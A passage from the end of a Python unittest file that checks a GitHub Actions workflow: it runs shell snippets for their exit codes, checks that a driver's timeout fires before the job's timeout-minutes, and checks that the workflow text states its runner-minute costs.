                    done = subprocess.run([bash, '--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', textwrap.dedent(script)], env={'REF': ref, 'PATH': os.environ['PATH']},
                                          capture_output=True, text=True, timeout=30)
                    self.assertEqual(done.returncode, rc, done.stdout)

    def test_the_drivers_timeout_fires_before_the_jobs(self):  # GitHub's kill leaves no judged output; the driver's must come first
        minutes = [int(m) for m in re.findall(r'(?m)^    timeout-minutes: (\d+)$', REAL_WF)]
        job = max(minutes)
        self.assertGreaterEqual(job * 60 - sd.RUN_TIMEOUT, 300)   # the checkout, python, the plan and the download come before the line

    def test_the_real_workflow_names_what_it_costs(self):
        self.assertIn('hosted-runner minutes', REAL_WF)
        self.assertIn('macOS multiplier', REAL_WF)


if __name__ == '__main__':
    unittest.main()
